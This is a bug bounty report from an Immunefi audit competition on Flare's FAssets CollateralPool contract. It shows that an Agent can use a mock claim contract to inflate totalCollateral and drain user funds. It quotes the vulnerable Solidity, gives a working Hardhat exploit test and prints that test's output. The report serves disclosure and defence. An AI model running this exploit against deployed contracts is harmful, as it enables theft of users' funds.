# #45893 \[SC-High] Agent role can stolen nat token from protocol users

**Submitted on May 22nd 2025 at 04:35:59 UTC by @ox9527 for** [**Audit Comp | Flare | FAssets**](https://immunefi.com/audit-competition/audit-comp-flare-fassets)

* **Report ID:** #45893
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/flare-foundation/fassets/blob/main/contracts/assetManager/implementation/CollateralPool.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The Agent role can invoke claimAirdropDistribution or claimDelegationRewards to claim rewards from an external protocol and increase the value of totalCollateral. However, there are at least two critical vulnerabilities in this design:

1.Unverified Reward Token The contract does not verify the actual token received from the external .claim() function. Instead, it blindly trusts the return value (e.g., the claimed amount) from the external call. This creates a risk if the claimed token is not the expected collateral token.

2.Missing Native Token Receiver The CollateralPool.sol contract does not implement a receive() function, which means it cannot properly receive native tokens (e.g., ETH or MATIC). If the external claim function returns native tokens, they will be lost or misaccounted.

## Vulnerability Details

Exploit Scenario: An attacker with Agent privileges can deploy a malicious contract and configure it as the external claim target. When the protocol calls the malicious .claim() function:

The contract does not actually transfer any tokens to CollateralPool.sol. It fakes a large return value, e.g., returns 10\_000 ether as the claimed amount. Since the protocol blindly adds the claimed amount to totalCollateral, this inflated value skews the internal accounting. As a result: Any user exiting the pool (redeeming their share) can receive more than they should, especially if the system allows withdrawal of native tokens or stablecoins based on totalCollateral. The malicious Agent can also exit early and receive an outsized portion of the actual collateral. Remaining users are left with under-collateralized or even bad debt.

## Impact Details

protocol users lost of funds result in can't exist due to lack of token

## References

```solidity
    function claimDelegationRewards(
        IRewardManager _rewardManager,
        uint24 _lastRewardEpoch,
        IRewardManager.RewardClaimWithProof[] calldata _proofs
    )
        external
        onlyAgent
        returns (uint256)
    {
        uint256 claimed = _rewardManager.claim(address(this), payable(address(this)), _lastRewardEpoch, true, _proofs);
        totalCollateral += claimed;
        emit ClaimedReward(claimed, 1);
        return claimed;
    }

    function claimAirdropDistribution(
        IDistributionToDelegators _distribution,
        uint256 _month
    )
        external
        onlyAgent
        returns(uint256)
    {
        uint256 claimed = _distribution.claim(address(this), payable(address(this)), _month, true);
        totalCollateral += claimed;
        emit ClaimedReward(claimed, 0);
        return claimed;
    }
```

## Proof of Concept

## Proof of Concept

Add the following test to file CollateralPool.ts :

```ts
        it("Test Agent Role use Malicious Contract ", async () => {
            await givePoolFAssetFees(ETH(1));

            // account0 enters the pool
            await collateralPool.enter(0, false, { value: ETH(1) , from:accounts[0]});
            const tokens = await collateralPoolToken.balanceOf(accounts[0]);
            console.log("account0 get token:", tokens.toString());

            // account1 enters the pool with 100 ETH
            await collateralPool.enter(0, false, { value: ETH(100), from: accounts[1] });
            const tokens1 = await collateralPoolToken.balanceOf(accounts[1]);
            console.log("account1 get token:", tokens1.toString());

            // give some collateral using mock airdrop
            const mockAirdrop = await MockContract.new();
            await mockAirdrop.givenAnyReturnUint(ETH(10000));
            await collateralPool.claimAirdropDistribution(mockAirdrop.address, 1, { from: agent });

            const balBefore = toBN(await web3.eth.getBalance(accounts[0]));
            await collateralPool.exit(tokens.toString(), TokenExitType.KEEP_RATIO, { from: accounts[0] });
            const balAfter = toBN(await web3.eth.getBalance(accounts[0]));

            console.log("account0 get nat:", balAfter.sub(balBefore).toString());
        });
```

Out:

```shell
npx hardhat test test/unit/fasset/implementation/CollateralPool.ts

user mint token Share: 1111111111111111110
account0 get token: 1111111111111111110
account1 get token: 111111111111111111000
account0 get nat: 100009089418408317826
      ✔ Test Agent Role use Malicious Contract  (35ms)
```

From above test we can see account\[0] claim the whole balance from CollateralPool contract
